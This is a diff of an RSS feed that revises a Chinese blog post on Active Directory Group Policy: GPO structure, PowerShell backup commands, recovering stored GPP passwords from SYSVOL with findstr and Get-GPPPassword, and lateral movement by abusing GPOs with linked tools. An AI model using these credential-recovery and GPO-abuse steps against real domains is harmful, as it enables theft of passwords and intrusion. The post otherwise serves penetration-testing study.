@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Wed, 06 Apr 2022 23:17:58 &#43;0800</lastBuildDate>
+        <lastBuildDate>Wed, 06 Apr 2022 23:45:43 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://myzxcg.com/rss.xml" />
         
@@ -13952,54 +13952,61 @@ windows命令&lt;/p&gt;
                 
                 <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                 
-                    <description>&lt;h2 id=&#34;组策略介绍&#34;&gt;组策略介绍&lt;/h2&gt;
+                    <description>&lt;h2 id=&#34;基本介绍&#34;&gt;基本介绍&lt;/h2&gt;
 &lt;blockquote&gt;
-&lt;p&gt;组策略可以控制用户帐户和计算机帐户的工作环境，提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。&lt;/p&gt;
+&lt;p&gt;组策略提供对域用户、成员机器、应用程序的集中化管理和配置。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;组策略可分为本机组策略和域的组策略：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;本机组策略用于计算机管理员统一管理本机以及所有用户。&lt;/li&gt;
 &lt;li&gt;域内的组策略用于域管统一管理域内的所有计算机以及域用户。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;组策略链接&#34;&gt;组策略链接&lt;/h3&gt;
-&lt;p&gt;以&lt;code&gt;Default Domain Policy&lt;/code&gt;为例，在右边的作用域里面，可以看到它链接到test.local整个域，也就是说在test.local域内的所有计算机，用户都会受到这条组策略的影响。链接的位置可以是站点、域以及OU。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806218.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;比如说财务桌面壁纸这条组策略。它就链接到财务这个OU。加入财务这个OU的所有计算机以及用户会受到影响。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806361.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;组策略内容&#34;&gt;组策略内容&lt;/h3&gt;
-&lt;p&gt;打开组策略编辑器，可以看到分为计算机配置以及用户配置，分别作用于计算机和用户。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806472.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;在配置下又分为策略以及首选项。&lt;/p&gt;
-&lt;p&gt;首选项是Windows Server 2008发布后用来对GPO中的组策略提供额外的功能。&lt;strong&gt;策略和首选项的不同之处就在于强制性。策略是受管理的、强制实施的。而首选项则是不受管理的、非强制性的。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;对于很多系统设置来说，既可以通过策略设置来实现，也可以通过策略首选项来实现，二者有相当一部分的重叠。&lt;/p&gt;
-&lt;h3 id=&#34;组策略更新&#34;&gt;组策略更新&lt;/h3&gt;
-&lt;p&gt;默认情况下，客户端更新组策略的方式主要有&lt;/p&gt;
-&lt;ol&gt;
+&lt;p&gt;打开组策略管理 &lt;code&gt;gpmc.msc&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
 &lt;li&gt;
-&lt;p&gt;后台轮询检查sysvol里的GPT.ini，如果版本高于本地保存的组策略版本，客户端将会更新本地的组策略。轮询的时间是，默认情况下，计算机组策略会在后台每隔 90 分钟更新一次，并将时间作 0 到 30 分钟的随机调整。域控制器上的组策略会每隔 5 分钟更新一次。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;组策略链接&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;以Default Domain Policy为例。在右边的作用域里，可以看到它链接到test.local整个域。也就是说在test.local域内的所有计算机、用户都会受到这条组策略的影响。链接的位置可以是域、OU等。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/16492589190575.jpg&#34; alt=&#34;&#34;&gt;
+注意到图片最下面有一个WMI筛选，此功能是作用于筛选后的指定计算机。比如说作用于所有WIN7的电脑，那么只有WIN7的电脑才会应用此组策略。&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;用户开机登录时会检查sysvol里的GPT.ini，如果高于本地保存的组策略版本，将会更新本地的组策略。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;组策略内容&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;打开组策略编辑器，可以看到分为&lt;code&gt;计算机配置&lt;/code&gt;以及&lt;code&gt;用户配置&lt;/code&gt;，分别作用于计算机和用户。在配置下又分为策略以及首选项。&lt;/p&gt;
+&lt;p&gt;首选项是Windows Server 2008发布后用来对GPO中的组策略提供额外的功能。&lt;strong&gt;策略和首选项的不同之处就在于强制性。策略是受管理的、强制实施的。而首选项则是不受管理的、非强制性的。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806472.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;组策略更新&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;默认情况下，客户端更新组策略有以下几种方式&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;后台轮询检查域控SYSVOL里每条组策略的GPT.ini，如果高于本地保存的组策略版本，客户端将会更新本地的组策略。默认情况下，计算机组策略会在后台每隔 90 分钟（0-30分钟的抖动）更新一次。域控制器上的组策略会每隔 5 分钟更新一次。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用户开机登录时会检查SYSVOL里的GPT.ini。&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;客户端强制更新，执行&lt;code&gt;gpupdate /force&lt;/code&gt;。&lt;/p&gt;
-&lt;p&gt;域控强制客户端更新（不会比较域共享目录中组策略的版本）执行 &lt;code&gt;Invoke-GPUpdate -Computer &amp;quot;TESTwin10&amp;quot; -Target &amp;quot;User&amp;quot;&lt;/code&gt; （2008 R2默认不支持该命令，2012支持）&lt;/p&gt;
+&lt;p&gt;域控强制客户端更新&lt;code&gt;Invoke-GPUpdate -Computer &amp;quot;TESTwin10&amp;quot; -Target &amp;quot;User&amp;quot;&lt;/code&gt;（不会比较域共享目录中组策略的版本，2008 R2 默认不支持该命令，2012支持）&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;组策略应用顺序：&lt;/p&gt;
-&lt;p&gt;应用本地组策略 →如果有站点组策略则应用→应用域策略→应用OU上的策略。&lt;/p&gt;
-&lt;p&gt;如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用。如果多个组策略设置冲突，则后应用的组策略覆盖先应用的组策略。&lt;/p&gt;
-&lt;h3 id=&#34;组策略存储&#34;&gt;组策略存储&lt;/h3&gt;
-&lt;p&gt;每条组策略可以看做是存储在域级别的一个虚拟对象，叫做GPO。每个GPO有唯一标志，用来标识每条组策略(或者说每个GPO)，GPO在域内存储分为两个部分：GPC、GPT。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;组策略应用顺序&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;本地组策略 →站点组策略→域组策略→OU组策略。&lt;/p&gt;
+&lt;p&gt;如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用。后应用的组策略覆盖先应用的组策略。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;组策略存储&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;组策略存储在域控的两个位置中。一条GPO可以认为就是一条组策略。GPO有唯一ID用来标识每条组策略。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806575.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;GPC位于LDAP中，&lt;code&gt;CN=Policies,CN=System,&amp;lt;BaseDn&amp;gt;&lt;/code&gt;下，每个条目对应一个GPC。包含了GPO属性，例如版本信息，GPO状态和其他组件设置。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806621.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;GPT位于&lt;code&gt;\\&amp;lt;DOMAIN&amp;gt;\SYSVOL\&amp;lt;DOMAIN&amp;gt;\Policies&lt;/code&gt;中。域内任何人都可以读取&lt;code&gt;\\&amp;lt;DOMAIN&amp;gt;\SYSVOL\&amp;lt;DOMAIN&amp;gt;\&lt;/code&gt;这个默认的共享路径下的内容。&lt;/p&gt;
-&lt;p&gt;GPC里面的gPCFileSysPath属性链接到GPT里面。GPT是一个文件系统文件夹，其中包含由.adm文件，安全设置，脚本文件以及有关可用于安装的应用程序的信息指定的策略数据。&lt;/p&gt;
-&lt;p&gt;在域、站点、OU上的gPLink属性来标识链接到这里的组策略，gPOptions属性来标识组策略是否会继承。&lt;/p&gt;
+&lt;p&gt;在 CN=Policies,CN=System,&lt;BaseDn&gt;下，存储了每个GPO的版本信息、GPO 状态和其他组件设置。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/16492591286112.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt;\\&amp;lt;DOMAIN&amp;gt;\SYSVOL\&amp;lt;DOMAIN&amp;gt;\Policies&lt;/code&gt;中（域内任何人都可以读取）保存了每条GPO的安全设置，脚本文件等策略数据。GPO 的&lt;code&gt;gPCFileSysPath&lt;/code&gt;属性指向了此路径。
+&lt;img src=&#34;https://myzxcg.com/images/16492591750446.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在域、OU上的gPLink属性来标识链接的组策略，gPOptions属性用于标识组策略是否会被继承。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806683.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;组策略利用&#34;&gt;组策略利用&lt;/h2&gt;
-&lt;h3 id=&#34;gpo-导出与备份&#34;&gt;GPO 导出与备份&lt;/h3&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;gpo-导出与备份&#34;&gt;GPO 导出与备份&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -14026,56 +14033,46 @@ windows命令&lt;/p&gt;
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#加载GroupPolicy模块 （win7没有，win10有）&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GroupPolicy&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#获得所有GPO的内容&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#获得所有GPO名称等基本信息&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#将所有GPO导出为一个HTML报告&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPOReport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ReportType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GposReport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GposReport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPOReport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ReportType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GposReport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#将每个GPO单独导出一个HTML报告&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;%{&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPOReport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;displayname&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ReportType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\GPOReports\&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;displayname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPOReport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;displayname&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ReportType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;displayname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#查看指定GPO的权限设置&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPPermission&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;客服部组策略&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-GPPermission&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Default Domain Policy&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#备份指定GPO&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Backup-Gpo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TestGPO1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GpoBackups&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Backup-Gpo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Default Domain Policy&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#备份所有GPO&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Backup-Gpo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\GpoBackups&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Backup-Gpo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#还原指定GPO&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Restore-GPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TestGPO1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GpoBackups&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Restore-GPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Default Domain Policy&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#还原所有GPO&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Restore-GPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\GpoBackups&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Restore-GPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;利用sysvol还原组策略中的密码&#34;&gt;利用SYSVOL还原组策略中的密码&lt;/h3&gt;
-&lt;p&gt;如果在组策略中输入了密码，如以用户身份运行程序、修改域内主机内置administrator用户密码等操作。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-1630806855.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后可以在GPT中看到加密后的密码（AES-256），而微软公开了解密私钥。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\SYSVOL\domain\Policies\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;ol&gt;
+&lt;/div&gt;&lt;h2 id=&#34;还原组策略中保存的密码&#34;&gt;还原组策略中保存的密码&lt;/h2&gt;
+&lt;p&gt;如果在组策略中输入了密码，如以用户身份运行计划任务、修改域内主机内置administrator用户密码等。&lt;/p&gt;
+&lt;p&gt;可以在SYSVOL下的配置中看到加密后的密码（AES-256），而微软公开了解密密钥。&lt;/p&gt;
+&lt;ol&gt;
 &lt;li&gt;
-&lt;p&gt;可以通过以下命令来快速搜索
-&lt;code&gt;findstr /S cpassword \\0day.org\sysvol\*.xml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可以通过以下命令来快速搜索&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;findstr /S cpassword \\0day.org\sysvol\*.xml&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;利用&lt;a href=&#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#34;&gt;Get-GPPPassword&lt;/a&gt;，自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码。&lt;/p&gt;
+&lt;p&gt;利用&lt;a href=&#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#34;&gt;Get-GPPPassword&lt;/a&gt;，自动查询SYSVOL中的文件，还原出所有明文密码。&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;Get-GPPPassword&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;strong&gt;修复：打了补丁KB2962486后，组策略中无法设置用户名密码。&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;组策略横向&#34;&gt;组策略横向&lt;/h3&gt;
-&lt;p&gt;在拿到域控之后，有时候可能网络ACL到达不了目标电脑，可以通过组策略进行横向。攻击者可以利用组策略来推出恶意软件、创建/修改计划任务、降级凭据保护、向所有计算机添加新的本地帐户被添加到本地管理员组。更改现有的安全策略，启用明文密码提取。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;计划任务&lt;/p&gt;
-&lt;p&gt;自Windows Server 2008开始，GPO开始支持计划任务，便于管理域中的计算机和用户。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/FSecureLABS/SharpGPOAbuse&#34;&gt;指定用户配置定时任务&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;修复：打了补丁KB2962486后，无法在组策略中设置用户名密码。&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;横向移动&#34;&gt;横向移动&lt;/h2&gt;
+&lt;p&gt;拿下域管权限后可能防火墙原因无法访问目标电脑，这时候可以利用组策略进行横向。&lt;/p&gt;
+&lt;p&gt;通过组策略来下放恶意软件、创建/修改计划任务、降级凭据保护、向计算机添加新的帐户到本地管理员组、启用明文密码提取等。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/FSecureLABS/SharpGPOAbuse&#34;&gt;https://github.com/FSecureLABS/SharpGPOAbuse&lt;/a&gt; 、https://github.com/FuzzySecurity/StandIn 实现计划任务、启动脚本、添加本地管理员用户。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/Hackndo/pyGPOAbuse&#34;&gt;https://github.com/Hackndo/pyGPOAbuse&lt;/a&gt; 可以实现计划任务、添加本地管理员。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/rootSySdk/PowerGPOAbuse&#34;&gt;https://github.com/rootSySdk/PowerGPOAbuse&lt;/a&gt; 可以实现的比较全。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -14090,84 +14087,57 @@ windows命令&lt;/p&gt;
 &lt;td class=&#34;lntd&#34;&gt;
